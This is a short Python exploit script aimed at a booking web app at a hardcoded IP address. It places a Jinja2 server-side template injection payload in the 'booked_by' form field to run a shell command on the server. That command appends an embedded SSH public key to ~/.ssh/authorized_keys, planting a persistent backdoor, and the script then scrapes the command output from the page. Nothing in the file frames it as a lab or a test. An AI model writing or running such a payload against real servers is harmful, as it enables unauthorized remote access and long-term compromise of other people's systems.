import requests
from bs4 import BeautifulSoup

KEY = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/sMHAgdeyZLGj9ilDhKCjA89PW0U7BbEG9wBQzJbS4io4LNyJ5/bpCEUXeUyvubc059NfReTW6Q4P+luCS2WQlAHIRm5hhitPWcuHyJMgvK3G74H52duXM68/TdnQxbff3uDXy+CIVlyU7UbJDGxLC6gPS1/gUCI54gUJZjug1zpdqT+oiY4sfjSxh6pEZRqy1jiZyipvTYIdRn7CJUZYbkoOPd/ZrJBNUfJoiiWcJTZaA5AJ5zKNegGgkG2/z17QSbdWVzkN/yYUiFk4DWCTpl19toj31GV36olNs4UuSTc7BXfcpnjHWlTE3qmPSQ8L3HCSov+TbDGgU0X53L478P7Gyk1NVvaKG5oAntvZMKDmg8+MTpkdhvxj/f3UmLvq1G5L6iZP4fbyjXuatdPA5YRrKuI61yYp0E8d/tmO3cFmhOyGh7RujJLJIyNvHmNHE1iFpNUCceAuuTB8SuLeT5tVARoRNrIobC34/UI0oPigt69T0LqBMNYDN9yzpyEOV6uu2BLxrF0kJQk7aVmoOduBWcNxQcbQfXT3hOsniXmWJExHZvWug9NUJS2YDNwRoR0+gW1Cfdmzg/JH4aKbt3ZWVdliLqFGO7FxCzIBqqe4dBgQrH2gulWH0bn+7O/q/1Kf6VzN2Zx7U/lCmInkOt8WkpoQbFB6E/u5JMFbMQ== windows-reverse"

URL = "http://135.235.193.119:5000/book/1"

def send_key(key, url):
    cmd = "echo '{}' >> ~/.ssh/authorized_keys".format(key)
    payload = "{{ cycler.__init__.__globals__.os.popen(" + repr(cmd) + ").read() }}"
    data = {
        "booked_by": payload,
        "date":      "2025-07-03",
        "start":     "09:00",
        "end":       "09:01",
        "action":    "preview",
    }
    resp = requests.post(url, data=data)
    resp.raise_for_status()

    soup = BeautifulSoup(resp.text, "html.parser")
    booking = soup.find("p", text=lambda t: t and "Booked by:" in t)
    if booking:
        text = booking.get_text().split("Booked by:")[-1].strip()
        print("Server response:\n", text)
    else:
        print("No output found in response.")

if __name__ == "__main__":
    send_key(KEY, URL)
